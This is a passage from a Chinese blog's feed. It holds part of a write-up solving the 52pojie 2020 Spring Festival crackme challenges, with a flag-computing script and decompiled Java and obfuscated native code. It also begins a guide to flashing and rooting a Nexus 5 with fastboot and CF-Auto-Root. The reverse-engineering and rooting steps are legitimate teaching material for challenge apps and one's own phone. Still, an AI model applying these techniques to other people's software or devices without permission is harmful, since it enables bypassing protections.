class="keyword">print</span> md5str.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">xorlist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    xorlist.append(ord(key1[i % <span class="number">9</span>]) ^ ord(md5str[i]))</span><br><span class="line"><span class="keyword">print</span> xorlist</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += hex(xorlist[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flag = flag[<span class="number">1</span>:<span class="number">31</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">30</span></span><br></pre></td></tr></table></figure><p>跑出来后在手机上验证一下结果的正确性：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/10.png" alt="在手机上进行验证"></p><p>回复公众号得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/11.jpg" alt="得到口令"></p><h1 id="【春节】解题领红包之四"><a href="#【春节】解题领红包之四" class="headerlink" title="【春节】解题领红包之四"></a>【春节】解题领红包之四</h1><p>用 jadx 分析，在 <code>onCreate()</code> 函数中，需要输入 uid 和目标字符串，其中 uid 用 0 补齐成 7 位。然后调用在 Native 层实现的 <code>checkSn()</code> 函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wuaipojie.crackme02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn;</span><br><span class="line">    <span class="keyword">private</span> EditText input_flag;</span><br><span class="line">    <span class="keyword">private</span> EditText input_uid;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">checkSn</span><span class="params">(String str, String str2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"xtian"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.input_uid = (EditText) findViewById(R.id.input_uid);</span><br><span class="line">        <span class="keyword">this</span>.input_flag = (EditText) findViewById(R.id.input_flag);</span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="keyword">this</span>.btn = button;</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                view = MainActivity.<span class="keyword">this</span>.input_uid.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span> (view.length() &lt; <span class="number">7</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> length = <span class="number">7</span> - view.length();</span><br><span class="line">                    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                        stringBuilder.append(<span class="string">"0"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    StringBuilder stringBuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    stringBuilder2.append(stringBuilder.toString());</span><br><span class="line">                    stringBuilder2.append(view);</span><br><span class="line">                    view = stringBuilder2.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                MainActivity mainActivity = MainActivity.<span class="keyword">this</span>;</span><br><span class="line">                <span class="keyword">if</span> (mainActivity.checkSn(view, mainActivity.input_flag.getText().toString().trim()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427"</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9"</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把 unicode 输出，可以看到通过了 <code>checkSn</code> 的检测就成功了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [1]: print u&quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;</span><br><span class="line">正确！！！请把结果直接提交到论坛领取奖励吧</span><br><span class="line"></span><br><span class="line">In [2]: print u&quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;</span><br><span class="line">验证错误，继续加油</span><br></pre></td></tr></table></figure><p>接下来打开 IDA 分析一下 so 文件。没有找到 checkSn 函数，基本上都被混淆了，说明函数是被动态注册的。JNI_OnLoad 的部分：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">JNI_OnLoad</span><span class="params">(_JavaVM *vm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JavaVM *vm_; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">int</span> (__fastcall *v4)(_JavaVM *, <span class="keyword">int</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>); <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+8h] [bp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// [sp+10h] [bp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+18h] [bp-B0h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+20h] [bp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+28h] [bp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+30h] [bp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// [sp+38h] [bp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+40h] [bp-88h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v15; <span class="comment">// [sp+48h] [bp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+50h] [bp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// [sp+7Ch] [bp-4Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// [sp+80h] [bp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> *v19; <span class="comment">// [sp+84h] [bp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> *v20; <span class="comment">// [sp+88h] [bp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *v21; <span class="comment">// [sp+8Ch] [bp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// [sp+90h] [bp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// [sp+94h] [bp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v24; <span class="comment">// [sp+98h] [bp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> **v25; <span class="comment">// [sp+9Ch] [bp-2Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> *v26; <span class="comment">// [sp+A0h] [bp-28h]</span></span><br><span class="line"></span><br><span class="line">  vm_ = vm;</span><br><span class="line">  v23 = &amp;Oo0O_8;</span><br><span class="line">  v24 = &amp;O0OO_9;</span><br><span class="line">  v18 = &amp;_stack_chk_guard;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( O0OO_9 &lt; <span class="number">10</span> )</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = v2 | ~((Oo0O_8 - <span class="number">1</span>) * Oo0O_8) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = &amp;v15;</span><br><span class="line">    v15 = <span class="number">0x58D3C185</span>;</span><br><span class="line">    v12 = <span class="number">0x58D3C185</span>;</span><br><span class="line">    v13 = &amp;v10;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = &amp;v11;</span><br><span class="line">      v17 = (<span class="keyword">int</span> *)&amp;v13;</span><br><span class="line">      v20 = &amp;v16;</span><br><span class="line">      v21 = &amp;v12;</span><br><span class="line">      v4 = (<span class="keyword">int</span> (__fastcall *)(_JavaVM *, <span class="keyword">int</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>))(*((_DWORD *)off_1D7B0 + <span class="number">0x1FEC2733</span>) - <span class="number">0x58D3C184</span>);</span><br><span class="line">      v14 = v4(vm, &amp;v10, <span class="number">0x10004</span>);</span><br><span class="line">      v5 = *v23;</span><br><span class="line">      <span class="keyword">for</span> ( i = *v24; *v24 &gt;= <span class="number">10</span> &amp;&amp; ((_BYTE)v5 - <span class="number">1</span>) * (_BYTE)v5 &amp; <span class="number">1</span>; i = *v24 )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v4(vm_, &amp;v10, <span class="number">0x10004</span>);</span><br><span class="line">        v14 = v4(vm_, &amp;v10, <span class="number">0x10004</span>);</span><br><span class="line">        v5 = *v23;</span><br><span class="line">      &#125;</span><br><span class="line">      v19 = &amp;v14;</span><br><span class="line">      v25 = &amp;off_1D7B0;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; <span class="number">10</span> || !(((_BYTE)v5 - <span class="number">1</span>) * (_BYTE)v5 &amp; <span class="number">1</span>) )</span><br><span class="line">        JUMPOUT(__CS__, *((_DWORD *)off_1D7B4 + <span class="number">0x1FEC27A2</span>) - <span class="number">0x49F16B40</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v9 = <span class="number">0x58D3C185</span>;</span><br><span class="line">    v8 = &amp;v7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TODO:</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-732955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-732955-1-1.html</a><br><a href="https://www.52pojie.cn/thread-749955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-749955-1-1.html</a><br><a href="https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example" target="_blank" rel="noopener">https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example</a><br><a href="https://www.52pojie.cn/thread-1101266-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1101266-1-1.html</a><br><a href="https://www.bodkin.ren/index.php/archives/533/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/533/</a><br><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-778654-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第二次参加领红包活动，这次有两题是 apk。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nexus5刷机、Root并安装Xposed框架</title>
    <link href="blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/"/>
    <id>blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/</id>
    <published>2020-02-05T06:59:47.000Z</published>
    <updated>2020-02-25T23:54:41.658Z</updated>
    
    <content type="html"><![CDATA[<p>在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。</p><a id="more"></a><p>查看设备名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell@hammerhead:/ $ getprop ro.product.device</span><br><span class="line">hammerhead</span><br></pre></td></tr></table></figure><h1 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h1><p>先使用 adb 命令进入 bootloader 模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br></pre></td></tr></table></figure><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/1.png" alt="bootloader界面样式"></p><p>这部机子一开始已经解锁了，所以会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fastboot oem unlock</span><br><span class="line">                                                   FAILED (remote: <span class="string">'Already Unlocked'</span>)</span><br><span class="line">fastboot: error: Command failed</span><br></pre></td></tr></table></figure><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>刷机一般是采用<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">官方的镜像</a>，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 <code>flash-all.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot devices</span><br><span class="line">0b83c85e00ce15f9fastboot</span><br><span class="line"></span><br><span class="line">$ ./flash-all.sh</span><br><span class="line">Sending <span class="string">'bootloader'</span> (2508 KB)                     OKAY [  0.290s]</span><br><span class="line">Writing <span class="string">'bootloader'</span>                               OKAY [  0.497s]</span><br><span class="line">Finished. Total time: 0.981s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.094s]</span><br><span class="line">Finished. Total time: 0.094s</span><br><span class="line">Sending <span class="string">'radio'</span> (45409 KB)                         OKAY [  1.640s]</span><br><span class="line">Writing <span class="string">'radio'</span>                                    OKAY [  3.105s]</span><br><span class="line">Finished. Total time: 4.975s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.106s]</span><br><span class="line">Finished. Total time: 0.106s</span><br><span class="line">--------------------------------------------</span><br><span class="line">Bootloader Version...: HHZ11k</span><br><span class="line">Baseband Version.....: M8974A-2.0.50.1.13</span><br><span class="line">Serial Number........: 0b83c85e00ce15f9</span><br><span class="line">--------------------------------------------</span><br><span class="line">extracting android-info.txt (0 MB) to RAM...</span><br><span class="line">Checking <span class="string">'product'</span>                                 OKAY [  0.097s]</span><br><span class="line">Checking <span class="string">'version-bootloader'</span>                      OKAY [  0.100s]</span><br><span class="line">Checking <span class="string">'version-baseband'</span>                        OKAY [  0.100s]</span><br><span class="line">extracting boot.img (8 MB) to disk... took 0.038s</span><br><span class="line">archive does not contain <span class="string">'boot.sig'</span></span><br><span class="line">Sending <span class="string">'boot'</span> (8700 KB)                           OKAY [  0.490s]</span><br><span class="line">Writing <span class="string">'boot'</span>                                     OKAY [  0.749s]</span><br><span class="line">archive does not contain <span class="string">'dtbo.img'</span></span><br><span class="line">archive does not contain <span class="string">'dt.img'</span></span><br><span class="line">extracting recovery.img (9 MB) to disk... took 0.039s</span><br><span class="line">archive does not contain <span class="string">'recovery.sig'</span></span><br><span class="line">Sending <span class="string">'recovery'</span> (9284 KB)                       OKAY [  0.510s]</span><br><span class="line">Writing <span class="string">'recovery'</span>                                 OKAY [  0.776s]</span><br><span class="line">archive does not contain <span class="string">'vbmeta.img'</span></span><br><span class="line">archive does not contain <span class="string">'vbmeta_system.img'</span></span><br><span class="line">archive does not contain <span class="string">'super_empty.img'</span></span><br><span class="line">archive does not contain <span class="string">'odm.img'</span></span><br><span class="line">archive does not contain <span class="string">'product.img'</span></span><br><span class="line">extracting system.img (704 MB) to disk... took 3.704s</span><br><span class="line">archive does not contain <span class="string">'system.sig'</span></span><br><span class="line">Sending <span class="string">'system'</span> (721400 KB)                       OKAY [ 22.834s]</span><br><span class="line">Writing <span class="string">'system'</span>                                   OKAY [ 49.509s]</span><br><span class="line">archive does not contain <span class="string">'system_ext.img'</span></span><br><span class="line">archive does not contain <span class="string">'vendor.img'</span></span><br><span class="line">Erasing <span class="string">'userdata'</span>                                 OKAY [ 15.664s]</span><br><span class="line">mke2fs 1.44.4 (18-Aug-2018)</span><br><span class="line">Creating filesystem with 7137786 4k blocks and 1785856 inodes</span><br><span class="line">Filesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,</span><br><span class="line">4096000</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span></span><br><span class="line">Writing inode tables: <span class="keyword">done</span></span><br><span class="line">Creating journal (32768 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Sending <span class="string">'userdata'</span> (4416 KB)                       OKAY [  0.244s]</span><br><span class="line">Writing <span class="string">'userdata'</span>                                 OKAY [  0.495s]</span><br><span class="line">Erasing <span class="string">'cache'</span>                                    OKAY [  0.600s]</span><br><span class="line">mke2fs 1.44.4 (18-Aug-2018)</span><br><span class="line">Creating filesystem with 179200 4k blocks and 44832 inodes</span><br><span class="line">Filesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275d</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">32768, 98304, 163840</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span></span><br><span class="line">Writing inode tables: <span class="keyword">done</span></span><br><span class="line">Creating journal (4096 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Sending <span class="string">'cache'</span> (428 KB)                           OKAY [  0.211s]</span><br><span class="line">Writing <span class="string">'cache'</span>                                    OKAY [  0.219s]</span><br><span class="line">Rebooting                                          OKAY [  0.100s]</span><br><span class="line">Finished. Total time: 100.120s</span><br></pre></td></tr></table></figure><p>完成后，如果没有什么故障，稍过片刻就能打开新的系统了。</p><blockquote><p>我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 <code>/data</code> 和 <code>/cache</code> 进行格式化，照着<a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">这篇文章</a>对系统进行双清后，容量恢复到了正常状态。</p></blockquote><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/2.png" alt="recovery mode界面样式"></p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/3.png" alt="进行格式化"></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>刷完机后，可以进行 root 了。下载 Android Root 包 <a href="https://autoroot.chainfire.eu/" target="_blank" rel="noopener">CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a> 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tools/fastboot-mac --version</span><br><span class="line">fastboot version 09a0d98bebce-android</span><br></pre></td></tr></table></figure><p>本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fastboot --version</span><br><span class="line">fastboot version 29.0.2-5738569</span><br><span class="line">Installed as /usr/local/bin/fastboot</span><br></pre></td></tr></table></figure><p>然后进入 bootloader，并执行 root-mac.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ ./root-mac.sh</span><br><span class="line"></span><br><span class="line">----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----</span><br><span class="line"></span><br><span class="line">If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;</span><br><span class="line">option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.</span><br><span class="line"></span><br><span class="line">If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the</span><br><span class="line">&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">Please make sure your device is in bootloader/fastboot mode before continuing.</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***</span><br><span class="line"></span><br><span class="line">We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your device</span><br><span class="line">was not previously unlocked, this will wipe all your data !</span><br><span class="line"></span><br><span class="line">Please watch the screen on your device, user input may be required.</span><br><span class="line"></span><br><span class="line">You may need to enter your administrator password to continue.</span><br><span 